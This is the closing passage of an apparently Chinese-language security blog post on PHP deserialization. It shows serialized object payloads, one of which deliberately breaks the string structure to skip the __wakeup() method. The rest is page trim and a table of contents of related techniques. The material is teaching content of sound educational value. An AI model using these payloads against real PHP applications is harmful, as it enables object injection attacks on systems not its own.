<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;illy4&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;object&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;ZLARYY&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;xiexie&quot;</span>;N;s:<span class="number">11</span>:<span class="string">&quot;*Chesmond&quot;</span>;N;s:<span class="number">13</span>:<span class="string">&quot;ZLARYYArach&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们让他反序列化内容变为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;illy4&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;object&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;ZLARYY&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;xiexie&quot;</span>;N;s:<span class="number">11</span>:<span class="string">&quot;*Chesmond&quot;</span>;N;s:<span class="number">13</span>:<span class="string">&quot;ZLARYYArach&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>那么这种情况也可以实现绕过__wakeup()</p>
<img src="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup5.png" class="" title="wakeup5"></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ZLARYY123.github.io">ZLARYY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://zlaryy123.github.io/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://zlaryy123.github.io/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avertar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/12/SSRF/" title="SSRF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">SSRF</div></div><div class="info-2"><div class="info-item-1">SSRFSSRF:服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。 SSRF 漏洞出现的场景 ：  能够对外发起网络请求的地方，就可能存在 SSRF 漏洞 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed） 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB） Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP） 文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）  相关的函数 file_get_contents： 这个函数的本意是读取文件内容到字符串，但它也支持使用HTTP、FTP等协议读取远程资源。当开发者直接使用$_GET[&#39;url&#39;]这样的用户输入作为参数时，攻击者就可以构造恶意URL。 1234&lt;?p...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avertar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZLARYY</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZLARYY123"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">php序列化：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">序列化字符串：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF"><span class="toc-number">1.1.2.</span> <span class="toc-text">类的继承</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%BF%AE%E9%A5%B0%E7%AC%A6-%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">访问修饰符 ：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">魔术方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#construct-%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">__construct()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct-%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">__destruct()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup-%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">__wakeup()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-%EF%BC%9A"><span class="toc-number">1.2.4.</span> <span class="toc-text">__sleep()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-%EF%BC%9A"><span class="toc-number">1.2.5.</span> <span class="toc-text">__toString()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke"><span class="toc-number">1.2.6.</span> <span class="toc-text">__invoke():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-%EF%BC%9A"><span class="toc-number">1.2.7.</span> <span class="toc-text">__call()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#callStatic-%EF%BC%9A"><span class="toc-number">1.2.8.</span> <span class="toc-text">__callStatic()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-%EF%BC%9A"><span class="toc-number">1.2.9.</span> <span class="toc-text">__set()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-%EF%BC%9A"><span class="toc-number">1.2.10.</span> <span class="toc-text">__get()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isset-%EF%BC%9A"><span class="toc-number">1.2.11.</span> <span class="toc-text">__isset()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unset-%EF%BC%9A"><span class="toc-number">1.2.12.</span> <span class="toc-text">__unset()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#clone-%EF%BC%9A"><span class="toc-number">1.2.13.</span> <span class="toc-text">__clone()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debugInfo-%EF%BC%9A"><span class="toc-number">1.2.14.</span> <span class="toc-text">__debugInfo()：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-state-%EF%BC%9A"><span class="toc-number">1.2.15.</span> <span class="toc-text">__set_state()：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE"><span class="toc-number">1.3.</span> <span class="toc-text">POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POLARD-N%E7%AE%80%E5%8D%95%E4%B8%8A%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E8%AF%95%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">POLARD&amp;N简单上的php反序列化初试：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.4.</span> <span class="toc-text">phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-WEEK3-ez-phar"><span class="toc-number">1.4.1.</span> <span class="toc-text">[HNCTF 2022 WEEK3]ez_phar</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.</span> <span class="toc-text">session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-session%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-number">1.5.1.</span> <span class="toc-text">PHP session序列化机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">php处理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.3.</span> <span class="toc-text">session反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">原生类反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Error%E7%B1%BB"><span class="toc-number">1.6.1.</span> <span class="toc-text">Error类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exception%E7%B1%BB"><span class="toc-number">1.6.2.</span> <span class="toc-text">Exception类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient%E7%B1%BB"><span class="toc-number">1.6.3.</span> <span class="toc-text">SoapClient类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E7%B1%BBReflection"><span class="toc-number">1.6.4.</span> <span class="toc-text">反射类Reflection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ReflectionClass"><span class="toc-number">1.6.4.1.</span> <span class="toc-text">ReflectionClass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ReflectionFunction"><span class="toc-number">1.6.4.2.</span> <span class="toc-text">ReflectionFunction</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ArrayObject%E7%BB%95%E8%BF%87O%E5%BC%80%E5%A4%B4%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.6.5.</span> <span class="toc-text">利用ArrayObject绕过O开头序列化字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">1.7.</span> <span class="toc-text">字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-%E5%A2%9E%E5%8A%A0"><span class="toc-number">1.7.1.</span> <span class="toc-text">字符串逃逸-增加</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-%E5%87%8F%E5%B0%91"><span class="toc-number">1.7.2.</span> <span class="toc-text">字符串逃逸-减少</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-wakeup"><span class="toc-number">1.8.</span> <span class="toc-text">绕过__wakeup()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7%E5%80%BC%E7%BB%95%E8%BF%87-wakeup"><span class="toc-number">1.8.1.</span> <span class="toc-text">修改属性值绕过__wakeup()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E5%9D%8F%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%93%E6%9E%84%E7%BB%95%E8%BF%87-wakeup"><span class="toc-number">1.8.2.</span> <span class="toc-text">破坏序列化字符串结构绕过__wakeup()</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化">php反序列化</a><time datetime="2026-02-16T04:00:00.000Z" title="Created 2026-02-16 12:00:00">2026-02-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/12/SSRF/" title="SSRF">SSRF</a><time datetime="2026-02-12T07:06:00.000Z" title="Created 2026-02-12 15:06:00">2026-02-12</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By ZLARYY</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async data-pjax src="/"></script></div></body></html>